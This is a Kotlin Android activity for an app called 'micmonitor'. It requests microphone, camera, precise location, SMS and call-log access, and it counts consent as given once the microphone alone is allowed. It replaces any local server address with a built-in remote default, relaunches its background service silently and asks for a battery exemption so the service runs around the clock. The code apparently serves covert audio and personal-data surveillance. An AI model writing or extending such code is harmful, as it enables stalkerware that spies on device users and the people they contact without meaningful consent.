package com.micmonitor.app

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    private val prefs by lazy {
        getSharedPreferences("micmonitor", Context.MODE_PRIVATE)
    }

    // All permissions needed
    private val requiredPermissions: Array<String>
        get() {
            val perms = mutableListOf(
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.CAMERA,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG,
            )
            return perms.toTypedArray()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Seed server configuration once so release builds can carry defaults.
        val existingUrl = prefs.getString("server_url", null).orEmpty().trim()
        if (existingUrl.isBlank() || isLocalOrLegacyServerUrl(existingUrl)) {
            prefs.edit().putString("server_url", MicService.DEFAULT_SERVER_URL).apply()
        }

        // Already set up — restart service silently
        if (prefs.getBoolean("consent_given", false) && hasAllPermissions()) {
            launchService()
            requestBatteryOptExemption()
            finish()
            return
        }

        setContentView(R.layout.activity_main)

        val btnGrant = findViewById<Button>(R.id.btnGrant)
        val tvStatus = findViewById<TextView>(R.id.tvStatus)

        btnGrant.setOnClickListener {
            tvStatus.apply {
                text = getString(R.string.status_requesting)
                visibility = android.view.View.VISIBLE
            }
            ActivityCompat.requestPermissions(this, requiredPermissions, REQUEST_CODE)
        }
    }

    private fun hasAllPermissions(): Boolean {
        return requiredPermissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == REQUEST_CODE) {
            val micIndex = permissions.indexOf(Manifest.permission.RECORD_AUDIO)
            val micGranted = micIndex >= 0 && grantResults[micIndex] == PackageManager.PERMISSION_GRANTED

            if (micGranted) {
                prefs.edit().putBoolean("consent_given", true).apply()
                Toast.makeText(
                    this,
                    getString(R.string.toast_all_granted),
                    Toast.LENGTH_SHORT
                ).show()
                launchService()
                requestBatteryOptExemption()
                finish()
            } else {
                Toast.makeText(
                    this,
                    getString(R.string.toast_mic_required),
                    Toast.LENGTH_LONG
                ).show()
                findViewById<TextView>(R.id.tvStatus).apply {
                    text = getString(R.string.status_retry)
                    visibility = android.view.View.VISIBLE
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        if (prefs.getBoolean("consent_given", false) && hasAllPermissions()) {
            finish()
        }
    }

    private fun launchService() {
        val intent = Intent(this, MicService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    /** Asks Android to exempt this app from battery optimization so service runs 24/7 */
    @SuppressLint("BatteryLife")
    private fun requestBatteryOptExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(PowerManager::class.java)
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                try {
                    startActivity(
                        Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                            .setData(Uri.parse("package:$packageName"))
                    )
                } catch (_: Exception) {
                    // OEMs may block this intent; open app settings as fallback.
                    try {
                        startActivity(
                            Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                                .setData(Uri.parse("package:$packageName"))
                        )
                    } catch (_: Exception) {
                        // No-op
                    }
                }
            }
        }
    }

    companion object {
        private const val REQUEST_CODE = 1001
    }

    private fun isLocalOrLegacyServerUrl(url: String): Boolean {
        val v = url.lowercase()
        val isLocal = v.contains("localhost") ||
            v.contains("127.0.0.1") ||
            Regex("(^|[/:])192\\.168\\.").containsMatchIn(v) ||
            Regex("(^|[/:])10\\.").containsMatchIn(v) ||
            Regex("(^|[/:])172\\.(1[6-9]|2\\d|3[0-1])\\.").containsMatchIn(v)
        return isLocal
    }
}

